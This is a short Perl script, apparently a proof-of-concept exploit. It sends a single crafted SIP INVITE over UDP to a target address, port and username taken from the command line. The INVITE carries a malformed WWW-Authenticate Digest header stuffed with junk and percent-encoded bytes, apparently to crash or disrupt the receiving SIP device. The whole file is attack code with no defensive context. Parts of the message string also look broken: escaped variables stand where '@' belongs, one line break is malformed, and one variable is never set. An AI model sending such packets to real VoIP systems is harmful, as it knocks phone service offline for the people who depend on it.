#!/usr/bin/perl

use IO::Socket::INET;

die "Usage $0 <dst> <port> <username>" unless ($ARGV[2]);

 

$socket=new IO::Socket::INET->new(PeerPort=>$ARGV[1],

        Proto=>'udp',

        PeerAddr=>$ARGV[0]);

 

$AUTH = "WWW-Authenticate: Digest
domain=\"/-+:\=\$\%D6\$;\$=;=\$=\$,\\$.=;\;;,&&+:::=\/2\$&;6+;+=\%A5==;\
:=;\$&\%A3:u,\=\;&;\+::+&;+,,&/&\=,;=&:&,=&:;:;;K+&\=\%DA*\$;\&+&:;/=
=\%37:\%A6;,\\%ED,:=:\,;\%DA;&\$)\$+=;+:\%FE\$:\;&=,W;,g\%EF;\%FB:+\O\$+
\%AF+;+:,&=\%CA\%EA;\$,\+/;\,-;:;,P&\;_\$:\%C7&+&/!,\%EE\$:,\:;;\&\,+,
z\\$;\\\$\$::\/=,\$3\%ED=\+\%AE/=&\;;\$;&\$\%FE:\;\$+:\$\%EB\$=&:;&K&
;:\\%EA,=\%BA6\%21;=&:\$\"\r\n";

$msg = "INVITE sip:$ARGV[2]\$ARGV[0] SIP/2.0\r\nVia: SIP/2.0/UDP
192.168.1.2;branch=z9hG4bK056a27e7;rport\r\nFrom:
<sip:tucu\192.168.1.2>;tag=as011d1185\r\nTo:
<sip:$ARGV[2]\$ARGV[0]>;$TOTAG\r\n$AUTH\CSeq: 6106 INVITE\r\Max-Forwards:
70\r\nContent-Length: 0\r\n\r\n";

$socket->send($msg);  
 
